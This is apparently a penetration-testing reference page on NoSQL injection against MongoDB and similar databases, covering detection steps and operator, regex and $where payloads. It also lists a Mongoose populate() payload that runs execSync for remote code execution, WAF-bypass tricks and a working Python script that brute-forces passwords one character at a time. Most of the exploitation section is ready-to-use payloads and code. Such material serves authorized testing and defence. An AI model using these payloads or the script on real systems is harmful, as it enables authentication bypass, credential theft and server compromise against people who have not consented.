# NoSQL Injection

> **Summary**: Injecting NoSQL query operators or JavaScript into database queries to bypass authentication, extract data, or execute server-side code.
> **Impact**: Authentication bypass, data exfiltration, denial of service, remote code execution (via server-side JS).
> **Typical Severity**: High | Critical

## Detection

### Indicators

- Application uses MongoDB, CouchDB, or other NoSQL databases
- Parameters are passed as JSON objects or URL-encoded arrays (e.g., `param[$ne]=`)
- Error messages reference MongoDB operators, BSON, or Mongoose
- Application uses Node.js/Express with Mongoose or native MongoDB driver

### Automated Detection

```bash
# NoSQLMap
python nosqlmap.py -u "http://<TARGET>/login" -p "username,password"

# nosqli
nosqli scan -t "http://<TARGET>/login" -p "username"
```

### Manual Detection

1. **Operator injection test**: Replace a parameter value with `{"$ne": ""}` or append `[$ne]=` to URL params
   - Success: Different response (e.g., login bypass, additional data returned)
2. **Type confusion**: Send an array where a string is expected: `param[]=value`
3. **JavaScript injection**: Try `' || true || ''=='` in string-based query contexts
4. **Time-based blind**: Inject `{"$where": "sleep(5000)"}` and measure response time

## Exploitation

### Prerequisites

- Application passes user input into NoSQL queries without sanitization
- MongoDB operators (`$ne`, `$gt`, `$regex`, `$where`) are not stripped from input
- For `$where` attacks: server-side JavaScript must be enabled on MongoDB (disabled by default in v7.0+)

### Step-by-Step

1. **Identify NoSQL backend** -- Look for MongoDB error messages, JSON-based APIs, or Node.js stack
   - Success: Error messages or technology fingerprinting confirms NoSQL
2. **Test operator injection** -- Inject `$ne`, `$gt`, or `$regex` operators
   - Success: Altered query behavior (bypass auth, return extra records)
3. **Extract data** -- Use `$regex` for character-by-character extraction
   - Success: Boolean differences reveal data one character at a time
4. **Test JavaScript injection** -- If `$where` is available, inject JS for RCE
   - Success: Server executes arbitrary JavaScript

### Payloads (organized by context)

---

#### Authentication Bypass

**URL-Encoded (GET/POST form)**:
```
username[$ne]=invalid&password[$ne]=invalid
username[$gt]=&password[$gt]=
username[$regex]=.*&password[$regex]=.*
username[$exists]=true&password[$exists]=true
```

**JSON Body**:
```json
{"username": {"$ne": null}, "password": {"$ne": null}}
{"username": {"$ne": "foo"}, "password": {"$ne": "bar"}}
{"username": {"$gt": ""}, "password": {"$gt": ""}}
{"username": {"$in": ["admin", "administrator", "root"]}, "password": {"$gt": ""}}
{"username": {"$nin": []}, "password": {"$nin": []}}
```

---

#### Data Extraction via $regex

**Determine field length**:
```
username[$ne]=toto&password[$regex]=.{1}
username[$ne]=toto&password[$regex]=.{3}
username[$ne]=toto&password[$regex]=.{8}
```

**Extract character-by-character**:
```
username[$ne]=toto&password[$regex]=^a.*
username[$ne]=toto&password[$regex]=^b.*
username[$ne]=toto&password[$regex]=^m.*
username[$ne]=toto&password[$regex]=^md.*
username[$ne]=toto&password[$regex]=^mdp$
```

**JSON equivalent**:
```json
{"username": {"$eq": "admin"}, "password": {"$regex": "^a"}}
{"username": {"$eq": "admin"}, "password": {"$regex": "^ab"}}
{"username": {"$eq": "admin"}, "password": {"$regex": "^abc"}}
```

---

#### Server-Side JavaScript Injection ($where)

```
{"$where": "this.username == 'admin' && this.password == 'a' || 'a' == 'a'"}
```

**Tautology bypass**:
```
' || true || ''=='
" || true || ""=="
```

**SQL-like syntax in MongoDB**:
```
' || 1==1//
' || 1==1%00
admin' || 'a'=='a
```

**Error-based extraction (exfiltrate documents via errors)**:
```json
{"$where": "this.username=='admin'; throw new Error(JSON.stringify(this));"}
```

**Time-based blind**:
```
';sleep(5000);
';it=new Date();do{pt=new Date();}while(pt-it<5000);
{"$where": "sleep(5000) || true"}
```

---

#### Cross-Collection Data Access ($lookup)

When the application uses `aggregate()` instead of `find()`:

```json
[
  {
    "$lookup": {
      "from": "users",
      "as": "result",
      "pipeline": [
        {
          "$match": {
            "password": {
              "$regex": "^.*"
            }
          }
        }
      ]
    }
  }
]
```

---

#### GraphQL -> MongoDB Filter Confusion

```graphql
query {
  users(filter: { username: { $ne: "" } }) {
    _id
    email
    password
  }
}
```

Variables:
```json
{"f": {"$ne": {}}}
```

---

#### PHP-Specific (Array Injection)

PHP's `parse_str()` allows sending arrays via URL params:

```
username[$ne]=1&password[$ne]=1
username[$regex]=^admin&password[$gt]=
```

---

#### Mongoose populate() RCE (CVE-2024-53900 / CVE-2025-23061)

When `populate()` is used with `match`, operators are passed verbatim to MongoDB:

```
GET /posts?author[$where]=global.process.mainModule.require('child_process').execSync('id')
```

### Blind NoSQL Injection Script

```python
import requests, string

url = "http://<TARGET>/login"
alphabet = string.ascii_lowercase + string.ascii_uppercase + string.digits + "_@{}-/()!\"$%=^[]:;"
password = ""

while True:
    found = False
    for char in alphabet:
        payload = {"username": "admin", "password[$regex]": "^" + password + char}
        r = requests.post(url, data=payload)
        if "Welcome" in r.text or r.status_code == 302:
            password += char
            print(f"[+] Found: {password}")
            found = True
            break
    if not found:
        print(f"[*] Final password: {password}")
        break
```

### Proof of Concept

1. Send normal login: `username=admin&password=wrong` -> Login fails
2. Send injected login: `username=admin&password[$ne]=wrong` -> Login succeeds
3. Document the differing response to prove authentication bypass

## Bypasses

- **WAF bypass**: URL-encode operators (`%24ne` instead of `$ne`)
- **Double encoding**: `%2524ne` may bypass some filters
- **JSON vs URL-encoded**: Switch between content types to bypass input validation
- **Nested operators**: `{"$or": [{"$where": "..."}]}` to bypass top-level `$where` filtering
- **Unicode**: Use unicode equivalents for operator characters

## Escalation

- NoSQL Auth Bypass -> Access admin panel -> Full application compromise
- `$where` injection -> Server-side JavaScript execution -> RCE
- `$regex` extraction -> Credential theft -> Account takeover
- NoSQL + [GraphQL](graphql.md) -> Mass data extraction
- NoSQL + [Command Injection](command-injection.md) via `$where` -> OS-level access

## MongoDB Query Operators Reference

| Type | Operator | Description |
|------|----------|-------------|
| Comparison | `$eq` | Equal to |
| Comparison | `$ne` | Not equal to |
| Comparison | `$gt` / `$gte` | Greater than / Greater or equal |
| Comparison | `$lt` / `$lte` | Less than / Less or equal |
| Comparison | `$in` | Matches any value in array |
| Comparison | `$nin` | Matches none in array |
| Logical | `$and` | Both conditions must match |
| Logical | `$or` | Either condition matches |
| Logical | `$not` | Negates a condition |
| Logical | `$nor` | Neither condition matches |
| Evaluation | `$regex` | Matches regular expression |
| Evaluation | `$where` | Evaluates JavaScript expression |
| Evaluation | `$mod` | Modulo operation |

## Tools

| Tool | Usage |
|------|-------|
| [NoSQLMap](https://github.com/codingo/NoSQLMap) | Automated NoSQL injection and exploitation |
| [nosqli](https://github.com/Charlie-belmer/nosqli) | `nosqli scan -t <URL>` -- Go-based scanner |
| [NoSQL-Attack-Suite](https://github.com/C4l1b4n/NoSQL-Attack-Suite) | Comprehensive NoSQL attack toolkit |
| [StealthNoSQL](https://github.com/ImKKingshuk/StealthNoSQL) | Stealthy NoSQL injection scanner |
| [mongosh](https://www.mongodb.com/docs/mongodb-shell/) | `mongosh mongodb://<HOST>:27017` -- direct MongoDB interaction |

## References

- [PayloadsAllTheThings - NoSQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection)
- [HackTricks - NoSQL Injection](https://book.hacktricks.xyz/pentesting-web/nosql-injection)
- [NullSweep - NoSQL Injection Cheatsheet](https://nullsweep.com/nosql-injection-cheatsheet/)
- [SensePost - NoSQL Error-Based Injection](https://sensepost.com/blog/2025/nosql-error-based-injection/)
- [Mongoose CVE-2024-53900 / CVE-2025-23061](https://www.opswat.com/blog/technical-discovery-mongoose-cve-2025-23061-cve-2024-53900)
- [Rocket.Chat CVE-2023-28359](https://nvd.nist.gov/vuln/detail/CVE-2023-28359)
- [PortSwigger - NoSQL Injection](https://portswigger.net/web-security/nosql-injection)

**See also**: [GraphQL](graphql.md) | [Command Injection](command-injection.md)
